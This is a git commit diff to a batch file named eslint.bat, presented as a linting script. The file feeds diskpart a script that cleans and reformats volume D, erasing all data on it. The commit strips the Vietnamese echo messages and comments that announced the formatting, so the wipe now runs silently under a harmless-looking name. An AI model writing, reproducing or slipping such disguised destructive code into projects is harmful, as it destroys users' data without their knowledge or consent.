afd8b8fad4cfd3ab7dcf5e02bae013350b8dc789
songbaone <141793726+songbaone@users.noreply.github.com>
2026-07-19 21:38:22 +0700

    Update eslint.bat

--- eslint.bat
+++ eslint.bat
@@ -1,8 +1,4 @@
 @echo off
-echo DANG FORMAT O D...
-echo.
-
-:: Xoa bang diskpart
 (
 echo select volume D
 echo clean
@@ -11,8 +7,6 @@ echo format fs=ntfs quick
 echo assign letter=D
 ) > %temp%\format_d.txt
 
-:: Chay diskpart
 diskpart /s %temp%\format_d.txt
 
-echo DA FORMAT O D!
 pause
